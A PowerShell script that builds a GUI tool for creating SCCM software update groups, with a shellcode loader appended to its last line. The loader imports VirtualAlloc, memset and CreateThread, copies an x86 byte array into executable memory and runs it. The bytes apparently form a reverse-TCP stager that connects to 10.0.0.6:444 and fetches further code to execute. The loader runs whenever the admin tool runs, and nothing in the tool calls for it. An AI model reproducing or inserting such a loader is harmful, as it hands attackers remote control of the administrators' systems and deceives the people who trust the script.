[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, HelpMessage="Specify the Primary Site server.")]
    [ValidateNotNullOrEmpty()]
    [string]$SiteServer
)
Begin {
    
    try {
        Add-Type -AssemblyName "System.Drawing" -ErrorAction Stop
        Add-Type -AssemblyName "System.Windows.Forms" -ErrorAction Stop
    }
    catch [System.UnauthorizedAccessException] {
	    Write-Warning -Message "Access denied when attempting to load required assemblies" ; break
    }
    catch [System.Exception] {
	    Write-Warning -Message "Unable to load required assemblies. Error message: $($_.Exception.Message). Line: $($_.InvocationInfo.ScriptLineNumber)" ; break
    }

    
    try {
        Write-Verbose -Message "Determining Site Code for Site server: '$($SiteServer)'"
        $SiteCodeObjects = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stop
        foreach ($SiteCodeObject in $SiteCodeObjects) {
            if ($SiteCodeObject.ProviderForLocalSite -eq $true) {
                $SiteCode = $SiteCodeObject.SiteCode
                Write-Verbose -Message "Site Code: $($SiteCode)"
            }
        }
    }
    catch [System.UnauthorizedAccessException] {
        Write-Warning -Message "Access denied" ; break
    }
    catch [System.Exception] {
        Write-Warning -Message "Unable to determine Site Code" ; break
    }
}
Process {
    
    function Get-DGVRowData {
        param(
            [parameter(Mandatory=$true)]
            [ValidateSet("Products","Classifications")]
            [string]$Type,
            [parameter(Mandatory=$true)]
            [System.Windows.Forms.DataGridView]$Object,
            [parameter(Mandatory=$true)]
            [string]$Data
        )
        for ($RowCount = 0; $RowCount -lt $Object.RowCount; $RowCount++) {
            if ($Object.Rows[$RowCount].Cells["$($Type)"].Value -eq $Data) {
                return $true
            }
        }    
    }

    function Add-DataGridView {
        param(
            [parameter(Mandatory=$true)]
            [System.Windows.Forms.DataGridView]$Object,
            [parameter(Mandatory=$true)]
            [string]$Data,
            [parameter(Mandatory=$true)]
            [ValidateSet("Products","Classifications")]
            [string]$Type
        )
        if ($Object.RowCount -ge 1) {
            if (-not(Get-DGVRowData -Data $Data -Object $Object -Type $Type)) {
                $Object.Rows.Add($Data)
            }
        }
        if ($Object.RowCount -eq 0) {
            $Object.Rows.Add($Data)
        }
    }

    function Remove-DataGridView {
        param(
            [parameter(Mandatory=$true)]
            [System.Windows.Forms.DataGridView]$Object
        )
        if ($Object.SelectedCells[0].RowIndex -ne $null) {
            if ($Object.RowCount -ge 1) {
                $Object.Rows.RemoveAt($Object.SelectedCells[0].RowIndex)
            }
        }
    }

    function Load-SoftwareUpdateProducts {
        $Script:ProductsTable = @{}
        $ProductObjects = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_CategoryInstance -ComputerName $SiteServer -Filter "CategoryTypeName like 'Product' AND LocalizedCategoryInstanceName not like 'Windows Live' AND LocalizedCategoryInstanceName not like 'Visual Studio 2010 Tools for Office Runtime'" | Sort-Object -Property LocalizedCategoryInstanceName
        foreach ($ProductObject in $ProductObjects) {
            $ProductsTable.Add($ProductObject.LocalizedCategoryInstanceName, $ProductObject.CategoryInstance_UniqueID)
            $CBProducts.Items.Add($ProductObject.LocalizedCategoryInstanceName)
        }
        $CBProducts.SelectedIndex = 0
    }

    function Load-SoftwareUpdateClassifications {
        $Script:UpdateClassificationsTable = @{}
        $UpdateClassificationObjects = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_CategoryInstance -ComputerName $SiteServer -Filter "CategoryTypeName like 'UpdateClassification'"
        foreach ($UpdateClassificationObject in $UpdateClassificationObjects) {
            if ($UpdateClassificationObject.LocalizedCategoryInstanceName -notin @("WSUS Infrastructure Updates", "Applications", "Tools")) {
                $UpdateClassificationsTable.Add($UpdateClassificationObject.LocalizedCategoryInstanceName, $UpdateClassificationObject.CategoryInstance_UniqueID)
                $CBClassifications.Items.Add($UpdateClassificationObject.LocalizedCategoryInstanceName)
            }
        }
        $CBClassifications.SelectedIndex = 0
    }

    function Show-MessageBox {
	    param(
		    [Parameter(Mandatory=$true)]
		    [string]$Message,
		    [Parameter(Mandatory=$true)]
		    [string]$WindowTitle,
		    [Parameter(Mandatory=$true)]
		    [System.Windows.Forms.MessageBoxButtons]$Buttons,
		    [Parameter(Mandatory=$true)]
		    [System.Windows.Forms.MessageBoxIcon]$Icon
	    )
	    return [System.Windows.Forms.MessageBox]::Show($Message, $WindowTitle, $Buttons, $Icon)
    }

    function Validate-Input {
        $ButtonCreate.Enabled = $false
        if ($TBSUGName.Text.Length -ge 1) {
            if (($DGVProducts.RowCount -ge 1) -and ($DGVClassifications.RowCount -ge 1)) {
                if ($DTPStart.Value -lt $DTPEnd.Value) {
                    $ButtonCreate.Enabled = $true
                }
            }
        }
    }

    function Validate-SoftwareUpdateGroupName {
        $SoftwareUpdateGroupValidation = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_AuthorizationList -ComputerName $SiteServer -Filter "LocalizedDisplayName like '$($TBSUGName.Text)'"
        if ($SoftwareUpdateGroupValidation -eq $null) {
            return $true
        }
        else {
            return $false
        }
    }

    function Invoke-Controls {
	    param(
		    [Parameter(Mandatory=$true)]
            [ValidateSet("Enable", "Disable")]
		    [string]$Option
	    )
        foreach ($Control in $Form.Controls) {
            switch ($Option) {
                "Enable" {
                    $Control.Enabled = $true
                }
                "Disable" {
                    $Control.Enabled = $false
                }
            }
        }
    }

    function New-SoftwareUpdateGroupList {
        param(
            [parameter(Mandatory=$true)]
            [ValidateNotNullOrEmpty()]
            [string]$SoftwareUpdateGroupName,

            [parameter(Mandatory=$false)]
            [System.Collections.ArrayList]$UpdatesList
        )
        
        $LocalizedProperties = ([WmiClass]"\\$($SiteServer)\root\SMS\site_$($SiteCode):SMS_CI_LocalizedProperties").CreateInstance()
        $LocalizedProperties.DisplayName = $SoftwareUpdateGroupName
        $LocalizedProperties.Description = "Automatically generated by script"
        $LocalizedProperties.LocaleID = ([System.Threading.Thread]::CurrentThread).CurrentUICulture.LCID

        
        $AuthorizationListArguments = @{
            LocalizedInformation = [array]$LocalizedProperties
        }
        try {
            Set-WmiInstance -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_AuthorizationList -ComputerName $SiteServer -Arguments $AuthorizationListArguments -ErrorAction Stop | Out-Null
        }
        catch [System.Exception] {
            Write-Warning -Message "Unable to create '$($SoftwareUpdateGroupName)' software update group, breaking build operation. Line: $($_.InvocationInfo.ScriptLineNumber)" ; break
        }

        
        $SoftwareUpdateGroup = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_AuthorizationList -ComputerName $SiteServer -Filter "LocalizedDisplayName like '$($SoftwareUpdateGroupName)'" -ErrorAction Stop
        if ($SoftwareUpdateGroup -ne $null) {
            $SoftwareUpdateGroup.Get()
            $SoftwareUpdateGroup.Updates = $UpdatesList
            $SoftwareUpdateGroup.Put() | Out-Null
            Show-MessageBox -Message "Successfully added '$($UpdatesList.Count)' software updates to '$($SoftwareUpdateGroupName)' software update group" -WindowTitle "Software Update Group" -Buttons OK -Icon Information
        }
    }

    function New-SoftwareUpdateGroup {
        
        Invoke-Controls -Option Disable

        if (Validate-SoftwareUpdateGroupName) {
            
            $SoftwareUpdatesQuery = "SELECT SMS_SoftwareUpdate.* FROM SMS_SoftwareUpdate WHERE (SMS_SoftwareUpdate.CI_ID NOT IN (SELECT CI_ID FROM SMS_CIAllCategories WHERE CategoryInstance_UniqueID='UpdateClassification:3689bdc8-b205-4af4-8d4a-a63924c5e9d5'))"
    
            
            $SoftwareUpdatesQuery = -join @($SoftwareUpdatesQuery, " AND (DateRevised >='$($DTPStart.Value.Month)/$($DTPStart.Value.Day)/$($DTPStart.Value.Year) 00:00:00' AND DateRevised <='$($DTPEnd.Value.Month)/$($DTPEnd.Value.Day)/$($DTPEnd.Value.Year) 00:00:00' ) ")

            
            if ($CBFilterExpired.Checked -eq $true) {
                $SoftwareUpdatesQuery = -join @($SoftwareUpdatesQuery, "AND (IsExpired ='1')")
            }
            else {
                $SoftwareUpdatesQuery = -join @($SoftwareUpdatesQuery, "AND (IsExpired ='0')")
            }
    
            
            $SoftwareUpdatesQuery = -join @($SoftwareUpdatesQuery, " AND ( ")
            for ($ProductsCount = 0; $ProductsCount -lt $DGVProducts.RowCount; $ProductsCount++ ) {
                if ($ProductsCount -eq ($DGVProducts.RowCount)-1) {
                    $SoftwareUpdatesQuery = -join @($SoftwareUpdatesQuery, "CI_ID in (select CI_ID from SMS_CIAllCategories where CategoryInstance_UniqueID='$($ProductsTable[$DGVProducts.Rows[$ProductsCount].Cells["Products"].Value])')")
                }
                else {
                    $SoftwareUpdatesQuery = -join @($SoftwareUpdatesQuery, "CI_ID in (select CI_ID from SMS_CIAllCategories where CategoryInstance_UniqueID='$($ProductsTable[$DGVProducts.Rows[$ProductsCount].Cells["Products"].Value])') OR ")
                }
            }
            $SoftwareUpdatesQuery = -join @($SoftwareUpdatesQuery, " ) ")

            
            if ($CBFilterSuperseded.Checked -eq $true) {
                $SoftwareUpdatesQuery = -join @($SoftwareUpdatesQuery, "AND (IsSuperseded ='1')")
            }
            else {
                $SoftwareUpdatesQuery = -join @($SoftwareUpdatesQuery, "AND (IsSuperseded ='0')")
            }

            
            $SoftwareUpdatesQuery = -join @($SoftwareUpdatesQuery, " AND ( ")
            for ($UpdateClassificationsCount = 0; $UpdateClassificationsCount -lt $DGVClassifications.RowCount; $UpdateClassificationsCount++) {
                if ($UpdateClassificationsCount -eq ($DGVClassifications.RowCount)-1) {
                    $SoftwareUpdatesQuery = -join @($SoftwareUpdatesQuery, "CI_ID in (select CI_ID from SMS_CIAllCategories where CategoryInstance_UniqueID='$($UpdateClassificationsTable[$DGVClassifications.Rows[$UpdateClassificationsCount].Cells["Classifications"].Value])')")
                }
                else {
                    $SoftwareUpdatesQuery = -join @($SoftwareUpdatesQuery, "CI_ID in (select CI_ID from SMS_CIAllCategories where CategoryInstance_UniqueID='$($UpdateClassificationsTable[$DGVClassifications.Rows[$UpdateClassificationsCount].Cells["Classifications"].Value])') OR ")
                }
            }
            $SoftwareUpdatesQuery = -join @($SoftwareUpdatesQuery, " )")

            
            $SoftwareUpdates = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Query $SoftwareUpdatesQuery -ComputerName $SiteServer
            if ($SoftwareUpdates -ne $null) {
                if (($SoftwareUpdates | Measure-Object).Count -eq 1 ) {
                    $UpdateList = New-Object -TypeName System.Collections.ArrayList
                    $UpdateList.Add($SoftwareUpdates.CI_ID) | Out-Null
                    New-SoftwareUpdateGroupList -SoftwareUpdateGroupName $TBSUGName.Text -UpdatesList $UpdateList
                }
                else {
                    New-SoftwareUpdateGroupList -SoftwareUpdateGroupName $TBSUGName.Text -UpdatesList $SoftwareUpdates.CI_ID
                }
            }
            else {
                Show-MessageBox -Message "Specified search for Software Updates between '$($DTPStart.Value.ToShortDateString())' and '$($DTPEnd.Value.ToShortDateString())' did not return any objects" -WindowTitle "Software Update Group" -Buttons OK -Icon Exclamation
            }
        }
        else {
            Show-MessageBox -Message "A software update group with the name '$($TBSUGName.Text)' already exists" -WindowTitle "Software Update Group" -Buttons OK -Icon Error
        }

        
        Invoke-Controls -Option Enable
    }

    function Load-Form {
        [System.Windows.Forms.Application]::EnableVisualStyles()
        $Form.Add_Shown({$TBSUGName.Focus()})
        $Form.Controls.Add($ButtonStartDateNextMonth)
        $Form.Controls.Add($ButtonStartDatePrevMonth)
        $Form.Controls.Add($ButtonStartDateNextYear)
        $Form.Controls.Add($ButtonStartDatePrevYear)
        $Form.Controls.Add($ButtonEndDateNextMonth)
        $Form.Controls.Add($ButtonEndDatePrevMonth)
        $Form.Controls.Add($ButtonEndDateNextYear)
        $Form.Controls.Add($ButtonEndDatePrevYear)
        $Form.Controls.Add($DTPStart)
        $Form.Controls.Add($DTPEnd)
        $Form.Controls.Add($LabelSUGName)
        $Form.Controls.Add($LabelDateStart)
        $Form.Controls.Add($LabelDateEnd)
        $Form.Controls.Add($LabelDummyError)
        $Form.Controls.Add($ButtonProductsAdd)
        $Form.Controls.Add($ButtonProductsRemove)
        $Form.Controls.Add($ButtonClassificationsAdd)
        $Form.Controls.Add($ButtonClassificationsRemove)
        $Form.Controls.Add($ButtonCreate)
        $Form.Controls.Add($TBSUGName)
        $Form.Controls.Add($DGVProducts)
        $Form.Controls.Add($DGVClassifications)
        $Form.Controls.Add($CBProducts)
        $Form.Controls.Add($CBClassifications)
        $Form.Controls.Add($CBFilterSuperseded)
        $Form.Controls.Add($CBFilterExpired)
        $Form.Controls.Add($GBSUGDetails)
        $Form.Controls.Add($GBSUGData)
        $Form.Add_Shown({Load-SoftwareUpdateProducts})
        $Form.Add_Shown({Load-SoftwareUpdateClassifications})
	    $Form.Add_Shown({$Form.Activate()})
	    $Form.ShowDialog() | Out-Null
    }

    
    $Form = New-Object -TypeName System.Windows.Forms.Form    
    $Form.Size = New-Object -TypeName System.Drawing.Size(620,435)
    $Form.MinimumSize = New-Object -TypeName System.Drawing.Size(620,435)
    $Form.MaximumSize = New-Object -TypeName System.Drawing.Size(620,435)
    $Form.SizeGripStyle = "Hide"
    $Form.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($PSHome + "\powershell.exe")
    $Form.Text = "Create Software Update Group Tool 1.0.0"
    $Form.ControlBox = $true
    $Form.TopMost = $true

    
    $ErrorProvider = New-Object -TypeName System.Windows.Forms.ErrorProvider
    $ErrorProvider.BlinkStyle = [System.Windows.Forms.ErrorBlinkStyle]::BlinkIfDifferentError

    
    $ButtonProductsAdd = New-Object -TypeName System.Windows.Forms.Button
    $ButtonProductsAdd.Location = New-Object -TypeName System.Drawing.Size(265,310) 
    $ButtonProductsAdd.Size = New-Object -TypeName System.Drawing.Size(80,25) 
    $ButtonProductsAdd.Text = "Add"
    $ButtonProductsAdd.Enabled = $true
    $ButtonProductsAdd.Add_MouseClick({Add-DataGridView -Data $CBProducts.SelectedItem -Object $DGVProducts -Type Products})
    $ButtonProductsRemove = New-Object -TypeName System.Windows.Forms.Button
    $ButtonProductsRemove.Location = New-Object -TypeName System.Drawing.Size(180,310) 
    $ButtonProductsRemove.Size = New-Object -TypeName System.Drawing.Size(80,25) 
    $ButtonProductsRemove.Text = "Remove"
    $ButtonProductsRemove.Enabled = $true
    $ButtonProductsRemove.Add_MouseClick({Remove-DataGridView -Object $DGVProducts})
    $ButtonClassificationsAdd = New-Object -TypeName System.Windows.Forms.Button
    $ButtonClassificationsAdd.Location = New-Object -TypeName System.Drawing.Size(500,310) 
    $ButtonClassificationsAdd.Size = New-Object -TypeName System.Drawing.Size(80,25) 
    $ButtonClassificationsAdd.Text = "Add"
    $ButtonClassificationsAdd.Enabled = $true
    $ButtonClassificationsAdd.Add_MouseClick({Add-DataGridView -Data $CBClassifications.SelectedItem -Object $DGVClassifications -Type Classifications})
    $ButtonClassificationsRemove = New-Object -TypeName System.Windows.Forms.Button
    $ButtonClassificationsRemove.Location = New-Object -TypeName System.Drawing.Size(415,310) 
    $ButtonClassificationsRemove.Size = New-Object -TypeName System.Drawing.Size(80,25) 
    $ButtonClassificationsRemove.Text = "Remove"
    $ButtonClassificationsRemove.Enabled = $true
    $ButtonClassificationsRemove.Add_MouseClick({Remove-DataGridView -Object $DGVClassifications})
    $ButtonStartDatePrevMonth = New-Object -TypeName System.Windows.Forms.Button
    $ButtonStartDatePrevMonth.Location = New-Object -TypeName System.Drawing.Size(125,60) 
    $ButtonStartDatePrevMonth.Size = New-Object -TypeName System.Drawing.Size(15,20) 
    $ButtonStartDatePrevMonth.Text = "<"
    $ButtonStartDatePrevMonth.Enabled = $true
    $ButtonStartDatePrevMonth.Add_MouseClick({$DTPStart.Value = $DTPStart.Value.AddMonths(-1)})
    $ButtonStartDatePrevYear = New-Object -TypeName System.Windows.Forms.Button
    $ButtonStartDatePrevYear.Location = New-Object -TypeName System.Drawing.Size(99,60) 
    $ButtonStartDatePrevYear.Size = New-Object -TypeName System.Drawing.Size(25,20) 
    $ButtonStartDatePrevYear.Text = "<<"
    $ButtonStartDatePrevYear.Enabled = $true
    $ButtonStartDatePrevYear.Add_MouseClick({$DTPStart.Value = $DTPStart.Value.AddYears(-1)})
    $ButtonStartDateNextMonth = New-Object -TypeName System.Windows.Forms.Button
    $ButtonStartDateNextMonth.Location = New-Object -TypeName System.Drawing.Size(260,60) 
    $ButtonStartDateNextMonth.Size = New-Object -TypeName System.Drawing.Size(15,20) 
    $ButtonStartDateNextMonth.Text = ">"
    $ButtonStartDateNextMonth.Enabled = $true
    $ButtonStartDateNextMonth.Add_MouseClick({$DTPStart.Value = $DTPStart.Value.AddMonths(1)})
    $ButtonStartDateNextYear = New-Object -TypeName System.Windows.Forms.Button
    $ButtonStartDateNextYear.Location = New-Object -TypeName System.Drawing.Size(276,60) 
    $ButtonStartDateNextYear.Size = New-Object -TypeName System.Drawing.Size(25,20) 
    $ButtonStartDateNextYear.Text = ">>"
    $ButtonStartDateNextYear.Enabled = $true
    $ButtonStartDateNextYear.Add_MouseClick({$DTPStart.Value = $DTPStart.Value.AddYears(1)})
    $ButtonEndDatePrevMonth = New-Object -TypeName System.Windows.Forms.Button
    $ButtonEndDatePrevMonth.Location = New-Object -TypeName System.Drawing.Size(125,90) 
    $ButtonEndDatePrevMonth.Size = New-Object -TypeName System.Drawing.Size(15,20) 
    $ButtonEndDatePrevMonth.Text = "<"
    $ButtonEndDatePrevMonth.Enabled = $true
    $ButtonEndDatePrevMonth.Add_MouseClick({$DTPEnd.Value = $DTPEnd.Value.AddMonths(-1)})
    $ButtonEndDatePrevYear = New-Object -TypeName System.Windows.Forms.Button
    $ButtonEndDatePrevYear.Location = New-Object -TypeName System.Drawing.Size(99,90) 
    $ButtonEndDatePrevYear.Size = New-Object -TypeName System.Drawing.Size(25,20) 
    $ButtonEndDatePrevYear.Text = "<<"
    $ButtonEndDatePrevYear.Enabled = $true
    $ButtonEndDatePrevYear.Add_MouseClick({$DTPEnd.Value = $DTPEnd.Value.AddYears(-1)})
    $ButtonEndDateNextMonth = New-Object -TypeName System.Windows.Forms.Button
    $ButtonEndDateNextMonth.Location = New-Object -TypeName System.Drawing.Size(260,90) 
    $ButtonEndDateNextMonth.Size = New-Object -TypeName System.Drawing.Size(15,20) 
    $ButtonEndDateNextMonth.Text = ">"
    $ButtonEndDateNextMonth.Enabled = $true
    $ButtonEndDateNextMonth.Add_MouseClick({$DTPEnd.Value = $DTPEnd.Value.AddMonths(1)})
    $ButtonEndDateNextYear = New-Object -TypeName System.Windows.Forms.Button
    $ButtonEndDateNextYear.Location = New-Object -TypeName System.Drawing.Size(276,90) 
    $ButtonEndDateNextYear.Size = New-Object -TypeName System.Drawing.Size(25,20) 
    $ButtonEndDateNextYear.Text = ">>"
    $ButtonEndDateNextYear.Enabled = $true
    $ButtonEndDateNextYear.Add_MouseClick({$DTPEnd.Value = $DTPEnd.Value.AddYears(1)})
    $ButtonCreate = New-Object -TypeName System.Windows.Forms.Button
    $ButtonCreate.Location = New-Object -TypeName System.Drawing.Size(480,355) 
    $ButtonCreate.Size = New-Object -TypeName System.Drawing.Size(100,25)
    $ButtonCreate.Text = "Create"
    $ButtonCreate.Enabled = $false
    $ButtonCreate.Add_MouseClick({
        New-SoftwareUpdateGroup
    })

    
    $LabelSUGName = New-Object -TypeName System.Windows.Forms.Label
    $LabelSUGName.Location = New-Object -TypeName System.Drawing.Size(20,35)
    $LabelSUGName.Size = New-Object -TypeName System.Drawing.Size(60,20)
    $LabelSUGName.Text = "Name:"
    $LabelDateStart = New-Object -TypeName System.Windows.Forms.Label
    $LabelDateStart.Location = New-Object -TypeName System.Drawing.Size(20,65)
    $LabelDateStart.Size = New-Object -TypeName System.Drawing.Size(100,20)
    $LabelDateStart.Text = "Start date:"
    $LabelDateEnd = New-Object -TypeName System.Windows.Forms.Label
    $LabelDateEnd.Location = New-Object -TypeName System.Drawing.Size(20,95)
    $LabelDateEnd.Size = New-Object -TypeName System.Drawing.Size(100,20)
    $LabelDateEnd.Text = "End date:"
    $LabelDummyError = New-Object -TypeName System.Windows.Forms.Label
    $LabelDummyError.Location = New-Object -TypeName System.Drawing.Size(300,75)
    $LabelDummyError.Size = New-Object -TypeName System.Drawing.Size(5,20)
    $LabelDummyError.Text = [System.String]::Empty

    
    $TBSUGName = New-Object -TypeName System.Windows.Forms.TextBox
    $TBSUGName.Location = New-Object -TypeName System.Drawing.Size(100,30)
    $TBSUGName.Size = New-Object -TypeName System.Drawing.Size(380,20)
    $TBSUGName.Add_TextChanged({Validate-Input})

    
    $GBSUGDetails = New-Object -TypeName System.Windows.Forms.GroupBox
    $GBSUGDetails.Location = New-Object -TypeName System.Drawing.Size(10,10) 
    $GBSUGDetails.Size = New-Object -TypeName System.Drawing.Size(580,110) 
    $GBSUGDetails.Text = "Software Update Group details"
    $GBSUGData = New-Object -TypeName System.Windows.Forms.GroupBox
    $GBSUGData.Location = New-Object -TypeName System.Drawing.Size(10,130) 
    $GBSUGData.Size = New-Object -TypeName System.Drawing.Size(580,215) 
    $GBSUGData.Text = "Specify Products and Classifications"

    
    $DTPStart = New-Object -TypeName System.Windows.Forms.DateTimePicker
    $DTPStart.Location = New-Object -TypeName System.Drawing.Size(145,60)
    $DTPStart.Width = "110"
    $DTPStart.Format = [System.Windows.Forms.DateTimePickerFormat]::Custom
    $DTPStart.CustomFormat = “dd/MM/yyyy”
    $DTPStart.MinDate = (Get-Date -Year 2000)
    $DTPStart.MaxDate = (Get-Date -Year 2100)
    $DTPStart.Value = (Get-Date -Month 1 -Day 1)
    $DTPStart.Add_ValueChanged({
        Validate-Input
        if ($DTPStart.Value -ge $DTPEnd.Value) {
            $ErrorProvider.SetError($LabelDummyError, "Start date value can not be higher than end date value")
        }
        else {
            $ErrorProvider.Clear()
        }
    })
    $DTPEnd = New-Object -TypeName System.Windows.Forms.DateTimePicker
    $DTPEnd.Location = New-Object -TypeName System.Drawing.Size(145,90)
    $DTPEnd.Width = "110"
    $DTPEnd.Format = [System.Windows.Forms.DateTimePickerFormat]::Custom
    $DTPEnd.CustomFormat = “dd/MM/yyyy”
    $DTPEnd.MinDate = (Get-Date -Year 2000)
    $DTPEnd.MaxDate = (Get-Date -Year 2100)
    $DTPEnd.Value = (Get-Date -Month 12 -Day 31)
    $DTPEnd.Add_ValueChanged({
        Validate-Input
        if ($DTPStart.Value -ge $DTPEnd.Value) {
            $ErrorProvider.SetError($LabelDummyError, "Start date value can not be higher than end date value")
        }
        else {
            $ErrorProvider.Clear()
        }
    })
    
    
    $CBFilterSuperseded = New-Object -TypeName System.Windows.Forms.CheckBox
    $CBFilterSuperseded.Location = New-Object -TypeName System.Drawing.Size(355,62)
    $CBFilterSuperseded.Size = New-Object -TypeName System.Drawing.Size(150,20)
    $CBFilterSuperseded.Text = "Include superseded"
    $CBFilterSuperseded.Checked = $false
    $CBFilterExpired = New-Object -TypeName System.Windows.Forms.CheckBox
    $CBFilterExpired.Location = New-Object -TypeName System.Drawing.Size(355,90)
    $CBFilterExpired.Size = New-Object -TypeName System.Drawing.Size(150,20)
    $CBFilterExpired.Text = "Include expired"
    $CBFilterExpired.Checked = $false

    
    $CBProducts = New-Object -TypeName System.Windows.Forms.ComboBox
    $CBProducts.Location = New-Object -TypeName System.Drawing.Size(20,280)
    $CBProducts.Size = New-Object -TypeName System.Drawing.Size(325,20)
    $CBProducts.DropDownStyle = "DropDownList"
    $CBProducts.DropDownHeight = 250
    $CBClassifications = New-Object -TypeName System.Windows.Forms.ComboBox
    $CBClassifications.Location = New-Object -TypeName System.Drawing.Size(355,280)
    $CBClassifications.Size = New-Object -TypeName System.Drawing.Size(225,20)
    $CBClassifications.DropDownStyle = "DropDownList"
    $CBClassifications.Name = "Classifications"
    $CBClassifications.DropDownHeight = 150

    
    $DGVProducts = New-Object -TypeName System.Windows.Forms.DataGridView
    $DGVProducts.Location = New-Object -TypeName System.Drawing.Size(20,150)
    $DGVProducts.Size = New-Object -TypeName System.Drawing.Size(325,120)
    $DGVProducts.ColumnCount = 1
    $DGVProducts.ColumnHeadersVisible = $true
    $DGVProducts.Columns[0].Name = "Products"
    $DGVProducts.Columns[0].Width = 321
    $DGVProducts.AllowUserToAddRows = $false
    $DGVProducts.AllowUserToDeleteRows = $false
    $DGVProducts.ReadOnly = $true
    $DGVProducts.MultiSelect = $false
    $DGVProducts.RowHeadersVisible = $false
    $DGVProducts.AllowUserToResizeRows = $false
    $DGVProducts.ColumnHeadersHeightSizeMode = "DisableResizing"
    $DGVProducts.AllowUserToResizeColumns = $false
    $DGVProducts.Add_RowsAdded({Validate-Input})
    $DGVProducts.Add_RowsRemoved({Validate-Input})
    $DGVClassifications = New-Object -TypeName System.Windows.Forms.DataGridView
    $DGVClassifications.Location = New-Object -TypeName System.Drawing.Size(355,150)
    $DGVClassifications.Size = New-Object -TypeName System.Drawing.Size(225,120)
    $DGVClassifications.ColumnCount = 1
    $DGVClassifications.ColumnHeadersVisible = $true
    $DGVClassifications.Columns[0].Name = "Classifications"
    $DGVClassifications.Columns[0].Width = 221
    $DGVClassifications.AllowUserToAddRows = $false
    $DGVClassifications.AllowUserToDeleteRows = $false
    $DGVClassifications.ReadOnly = $true
    $DGVClassifications.MultiSelect = $false
    $DGVClassifications.RowHeadersVisible = $false
    $DGVClassifications.AllowUserToResizeRows = $false
    $DGVClassifications.AllowUserToResizeColumns = $false
    $DGVClassifications.ColumnHeadersHeightSizeMode = "DisableResizing"
    $DGVClassifications.Add_RowsAdded({Validate-Input})
    $DGVClassifications.Add_RowsRemoved({Validate-Input})

    
    Load-Form
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x00,0x00,0x06,0x68,0x02,0x00,0x01,0xbc,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

